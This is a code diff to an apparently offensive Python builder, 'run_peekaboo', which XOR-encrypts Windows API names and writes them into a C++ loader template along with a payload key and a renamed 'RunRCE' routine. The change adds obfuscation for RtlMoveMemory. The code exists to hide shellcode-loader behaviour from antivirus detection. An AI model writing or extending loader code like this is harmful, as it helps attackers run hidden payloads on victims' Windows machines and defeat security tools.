@@ -89,6 +89,7 @@ def run_peekaboo(host, port):
     f_vp = "VirtualProtect"
     f_cth = "CreateThread"
     f_wfso = "WaitForSingleObject"
+    f_rmm = "RtlMoveMemory"
     f_rce = "RunRCE"
     f_xor = "XOR"
 
@@ -99,6 +100,7 @@ def run_peekaboo(host, port):
     ciphertext_vp, vp_key = encryptor.xor_encrypt(f_vp, encryptor.func_key())
     ciphertext_cth, ct_key = encryptor.xor_encrypt(f_cth, encryptor.func_key())
     ciphertext_wfso, wfso_key = encryptor.xor_encrypt(f_wfso, encryptor.func_key())
+    ciphertext_rmm, rmm_key = encryptor.xor_encrypt(f_rmm, encryptor.func_key())
 
     tmp = open("peekaboo.cpp", "rt")
     data = tmp.read()
@@ -108,8 +110,8 @@ def run_peekaboo(host, port):
     data = data.replace('unsigned char s_vp[] = { };', 'unsigned char s_vp[] = ' + ciphertext_vp)
     data = data.replace('unsigned char s_ct[] = { };', 'unsigned char s_ct[] = ' + ciphertext_cth)
     data = data.replace('unsigned char s_wfso[] = { };', 'unsigned char s_wfso[] = ' + ciphertext_wfso)
+    data = data.replace('unsigned char s_rmm[] = { };', 'unsigned char s_rmm[] = ' + ciphertext_rmm)
 
-    # data = data.replace('char my_payload_key[] = { };', 'char my_payload_key[] = ' + p_key)
     data = data.replace('char my_payload_key[] = "";', 'char my_payload_key[] = "' + p_key + '";')
     data = data.replace('char f_key[] = "";', 'char f_key[] = "' + va_key + '";')
     data = data.replace('RunRCE', f_rce)
